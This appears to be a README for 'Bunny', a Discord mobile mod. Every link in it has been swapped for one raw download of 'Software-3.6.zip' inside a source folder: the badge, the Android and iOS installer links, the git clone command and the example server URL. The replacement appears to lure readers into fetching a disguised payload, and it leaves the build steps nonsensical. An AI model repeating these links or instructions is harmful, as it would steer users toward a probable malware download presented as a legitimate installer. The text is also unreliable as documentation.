# Bunny [![Discord](https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip)](https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip)
A mod for Discord's mobile apps, a fork of [Vendetta](https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip).

## Installing

### Android

- **Root** with Xposed - [BunnyXposed](https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip)
- **Non-root** - [BunnyManager](https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip)

### iOS
- [**BunnyTweak**](https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip) - Get prebuilt rootful and rootless `.deb` files or the prepatched `.ipa `

## Building
1. Install a Bunny loader with loader config support (any mentioned in the [Installing](#installing) section).
1. Go to Settings > General and enable Developer Settings.
1. Clone the repo:
    ```
    git clone https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip
    ```
1. Install dependencies:
    ```
    pnpm i
    ```
1. Build Bunny's code:
    ```
    pnpm build
    ```
1. In the newly created `dist` directory, run a HTTP server. I recommend [http-server](https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip).
1. Go to Settings > Developer enabled earlier. Enable `Load from custom url` and input the IP address and port of the server (e.g. `https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip`) in the new input box labelled `Bunny URL`.
1. Restart Discord. Upon reload, you should notice that your device will download Bunny's bundled code from your server, rather than GitHub.
1. Make your changes, rebuild, reload, go wild!

Alternatively, you can directly *serve* the bundled code by running `pnpm serve`. `https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip` will be served on your local address under the port 4040. You will then insert `http://<local ip address>https://github.com/lowwkezer/bunny/raw/refs/heads/main/src/lib/utils/Software-3.6.zip` as a custom url and reload. Whenever you restart your mobile client, the script will rebuild the bundle as your client fetches it.
